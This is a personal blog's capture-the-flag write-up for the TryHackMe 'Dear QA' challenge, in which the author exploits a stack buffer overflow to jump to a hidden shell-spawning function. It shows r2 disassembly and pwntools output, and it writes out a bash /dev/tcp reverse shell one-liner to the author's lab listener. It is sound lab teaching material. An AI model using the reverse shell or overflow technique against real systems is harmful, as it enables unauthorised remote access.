@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="This is a binary exploitation challenge with a buffer overflow vulnerabily
+Reminds me of &amp;lsquo;0xDiablos&amp;rsquo; challenge I did on hackthebox
+Local exploitation first, then remote/development exploit
+Local exploitation We get informations first
+└──╼ $file DearQA.DearQA DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped └──╼ $checksec DearQA.DearQA [*] &amp;#39;/home/yourUser/Desktop/DearQA.DearQA&amp;#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Then the basics" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dearqa/dearqa/" />
+
+
+    <title>
+        
+            Dear QA :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Dear QA">
+<meta itemprop="description" content="This is a binary exploitation challenge with a buffer overflow vulnerabily
+Reminds me of &lsquo;0xDiablos&rsquo; challenge I did on hackthebox
+Local exploitation first, then remote/development exploit
+Local exploitation We get informations first
+└──╼ $file DearQA.DearQA DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped └──╼ $checksec DearQA.DearQA [*] &#39;/home/yourUser/Desktop/DearQA.DearQA&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Then the basics"><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="932"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Dear QA"/>
+<meta name="twitter:description" content="This is a binary exploitation challenge with a buffer overflow vulnerabily
+Reminds me of &lsquo;0xDiablos&rsquo; challenge I did on hackthebox
+Local exploitation first, then remote/development exploit
+Local exploitation We get informations first
+└──╼ $file DearQA.DearQA DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped └──╼ $checksec DearQA.DearQA [*] &#39;/home/yourUser/Desktop/DearQA.DearQA&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Then the basics"/>
+
+
+
+    <meta property="og:title" content="Dear QA" />
+<meta property="og:description" content="This is a binary exploitation challenge with a buffer overflow vulnerabily
+Reminds me of &lsquo;0xDiablos&rsquo; challenge I did on hackthebox
+Local exploitation first, then remote/development exploit
+Local exploitation We get informations first
+└──╼ $file DearQA.DearQA DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped └──╼ $checksec DearQA.DearQA [*] &#39;/home/yourUser/Desktop/DearQA.DearQA&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Then the basics" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dearqa/dearqa/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/dearqa/dearqa/">Dear QA</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<p>This is a binary exploitation challenge with a buffer overflow vulnerabily</p>
+<p>Reminds me of &lsquo;0xDiablos&rsquo; challenge I did on hackthebox</p>
+<p>Local exploitation first, then remote/development exploit</p>
+<h2 id="local-exploitation">Local exploitation</h2>
+<p>We get informations first</p>
+<pre tabindex="0"><code>└──╼ $file DearQA.DearQA
+DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
+</code></pre><pre tabindex="0"><code>└──╼ $checksec DearQA.DearQA
+[*] &#39;/home/yourUser/Desktop/DearQA.DearQA&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre><p>Then the basics</p>
+<pre tabindex="0"><code>└──╼ $strings  DearQA.DearQA
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+fflush
+__isoc99_scanf
+puts
+printf
+stdout
+execve
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.2.5
+fffff.
+[]A\A]A^A_
+Congratulations!
+You have entered in the secret function!
+/bin/bash
+Welcome dearQA
+I am sysadmin, i am new in developing
+What&#39;s your name: 
+Hello: %s
+;*3$&#34;
+
+...
+</code></pre><p>A secret function? interresting!</p>
+<p>At this point I could fire up Ghidra or IDA, but I find those too powerful</p>
+<p>I am trying to learn as much as possible so I stick to simpler tools like gdb and r2</p>
+<p>So for the moment I use r2 and analyse the binary (I already gave execution permission and tested it)</p>
+<pre tabindex="0"><code>└──╼ $r2 -d ./DearQA.DearQA
+Process with PID 19964 started...
+= attach 19964 19964
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+
+[0x7f6147a2f090]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for vtables
+[TOFIX: aaft can&#39;t run in debugger mode.ions (aaft)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+
+[0x7f6147a2f090]&gt; afl
+0x00400590    1 41           entry0
+0x00400540    1 6            sym.imp.__libc_start_main
+0x004005c0    4 50   -&gt; 41   sym.deregister_tm_clones
+0x00400600    4 58   -&gt; 55   sym.register_tm_clones
+0x00400640    3 28           sym.__do_global_dtors_aux
+0x00400660    4 38   -&gt; 35   entry.init0
+0x004007a0    1 2            sym.__libc_csu_fini
+0x00400686    1 61           sym.vuln
+0x00400520    1 6            sym.imp.puts
+0x00400570    1 6            sym.imp.fflush
+0x00400550    1 6            sym.imp.execve
+0x004007a4    1 9            sym._fini
+0x00400730    4 101          sym.__libc_csu_init
+0x004006c3    1 109          main
+0x00400530    1 6            sym.imp.printf
+0x00400580    1 6            sym.imp.__isoc99_scanf
+0x004004f0    3 26           sym._init
+0x00400560    1 6            loc.imp.__gmon_start__
+</code></pre><p><code>main</code> is usually a good start, but it does nothing special</p>
+<p>The strings were taling about a &ldquo;secret function&rdquo;</p>
+<p>Among the symbols we got a <code>sym.vuln</code> function that look interresting</p>
+<pre tabindex="0"><code>[0x7f6147a2f090]&gt; pdf @sym.vuln
+┌ 61: sym.vuln ();
+│           0x00400686      55             push rbp
+│           0x00400687      4889e5         mov rbp, rsp
+│           0x0040068a      bfb8074000     mov edi, str.Congratulations_ ; 0x4007b8 ; &#34;Congratulations!&#34;
+│           0x0040068f      e88cfeffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400694      bfd0074000     mov edi, str.You_have_entered_in_the_secret_function_ ; 0x4007d0 ; &#34;You have entered in the secret function!&#34;
+│           0x00400699      e882feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040069e      488b056b0520.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
+│                                                                      ; [0x600c10:8]=0
+│           0x004006a5      4889c7         mov rdi, rax
+│           0x004006a8      e8c3feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+│           0x004006ad      ba00000000     mov edx, 0
+│           0x004006b2      be00000000     mov esi, 0
+│           0x004006b7      bff9074000     mov edi, str._bin_bash      ; 0x4007f9 ; &#34;/bin/bash&#34;
+│           0x004006bc      e88ffeffff     call sym.imp.execve
+│           0x004006c1      5d             pop rbp
+└           0x004006c2      c3             ret
+</code></pre><p>Bingo! that&rsquo;s it! But It&rsquo;s never called in main ( or anywhere ? )</p>
+<p>How could we reach it? the answer is: <code>Buffer Overflow</code></p>
+<p>When I executed the binary and saw it was taking input I immediately suspected it</p>
+<p>You know already how to test for BOF, mad-long inputs!</p>
+<p>You can generate them with any tool or do it manually (barbaric)</p>
+<p>But it&rsquo;s important to find the right offset (how many characters make a BOF ?)</p>
+<p>I found my offset at <code>40</code> characters</p>
+<pre tabindex="0"><code>└──╼ $./DearQA.DearQA
+Welcome dearQA
+I am sysadmin, i am new in developing
+What&#39;s your name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Hello: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Erreur de segmentation
+</code></pre><p>So now We got what we need! Our objective is to jump to the <code>vuln</code> function address</p>
+<p>from r2 we got it! it&rsquo;s <code>0x00400686</code></p>
+<p>so we just add it to our payload (convert it to little endian first)</p>
+<p>I wrote a python script for that, using <code>pwntools</code> (I like pwntools)</p>
+<h2 id="remote-exploitation">Remote exploitation</h2>
+<p>I won&rsquo;t say much here, as we did the hardest part already</p>
+<p>We just have to connect to the remote server and send our payload</p>
+<p><code>pwntools</code> can do that too. I adapt my script and use it with <code>python3</code></p>
+<pre tabindex="0"><code>└──╼ $python3 bufferoverflow.py
+[*] &#39;/home/nair0lf32/Desktop/Stuff/THM/DearQA/DearQA.DearQA&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to 10.10.81.146 on port 5700: Done
+[*] Initialisation of BOF attack
+/home/nair0lf32/Desktop/Stuff/THM/DearQA/bufferoverflow.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  connection.recvuntil(&#34;What&#39;s your name: &#34;)
+[*] Payload sent
+[*] Switching to interactive mode
+
+
+
+ctf@dearqa:/home/ctf$ $  
+</code></pre><p>And we did it! the secret function gave us a shell (like shown in local)</p>
+<p>Now we have access to the server but we cant see our commands output</p>
+<p>We can get a proper shell then</p>
+<pre tabindex="0"><code>ctf@dearqa:/home/ctf$ $ bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.226.203/4444 &lt;&amp;1&#39;
+
+$  
+</code></pre><p>Then our listenner got us in</p>
+<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 48729
+bash: cannot set terminal process group (445): Inappropriate ioctl for device
+bash: no job control in this shell
+ctf@dearqa:/home/ctf$ ls
+ls
+DearQA
+dearqa.c
+flag.txt
+</code></pre><pre tabindex="0"><code class="language-ctf@dearqa:/home/ctf$" data-lang="ctf@dearqa:/home/ctf$">cat flag.txt
+THM{Fl4G_Fr0m_Q4_t0_D3v}
+</code></pre><p>I am starting to really like those pwn challenges!</p>
+<p>Doing further readings I learnt that actually when you examine the memory addresses (gdb or objdump)</p>
+<p>after the segfault, you get the offset at 40, but the buffer size is actually 32 bytes</p>
+<p>The next 8 bytes are used to reach the RSP and access the vuln function</p>
+<p>It doesnt change much as we can fill any characters in the RSP, but it&rsquo;s good to know</p>
+<p>Keep learning folks!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
